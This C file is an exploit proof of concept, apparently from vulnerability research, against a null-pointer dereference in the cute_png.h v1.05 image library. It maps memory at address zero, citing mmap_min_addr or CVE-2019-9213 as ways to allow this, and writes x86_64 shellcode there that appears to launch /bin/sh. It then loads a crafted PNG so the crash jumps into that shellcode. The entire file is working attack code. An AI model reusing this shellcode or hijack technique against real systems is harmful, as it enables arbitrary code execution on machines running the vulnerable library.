/**
* @file         
* @brief		Exploit demostration for stkof-w133-cp_dynamic-cute_png-603
* @details	    First, fill null address with shellcode. Second, trigger null-pointer dereference to hijack control flow to null address.
* @author		Helson.S
* @date		    30/05/2024
* @version	    v1.0
*/


#define CUTE_PNG_IMPLEMENTATION
#include "cute_png.h"                   // cute_png.h v1.05
#include <string.h>
#include <sys/mman.h>

int main( )
{
    // shellcode for x86_64
    char *shellcode = "\x6a\x68\x48\xb8\x2f\x62\x69\x6e\x2f\x2f\x2f\x73\x50\x48\x89\xe7\x68\x72\x69\x01\x01\x81\x34\x24\x01\x01\x01\x01\x31\xf6\x56\x6a\x08\x5e\x48\x01\xe6\x56\x48\x89\xe6\x31\xd2\x6a\x3b\x58\x0f\x05";
    void *null_address = mmap(0, 0x1000, PROT_EXEC|PROT_READ|PROT_WRITE, MAP_PRIVATE|MAP_FIXED|MAP_ANONYMOUS, -1, 0);       // set mmap_min_addr to 0 or exploit CVE-2019-9213 to map null-pointer
    if (null_address == MAP_FAILED) {
        printf("[!] Cannot mmap at null");
        exit(EXIT_FAILURE);
    }
    if (null_address != (void*)0) {
        printf("[!] Bad map at %p\n", null_address);
        exit(EXIT_FAILURE);
    }
    else {
        printf("[+] done, mapped null address\n");
    }
    memcpy(0, shellcode, strlen(shellcode));

    printf("[+] trigger null-pointer dereference vulnerability to hijack control flow\n");
    const char *src = "../poc/sample16.png";
    cp_image_t png_img = cp_load_png(src);              // trigger null-pointer dereference to hijack control flow
    memset(&png_img, 0, sizeof(cp_image_t));

    return 0;
}
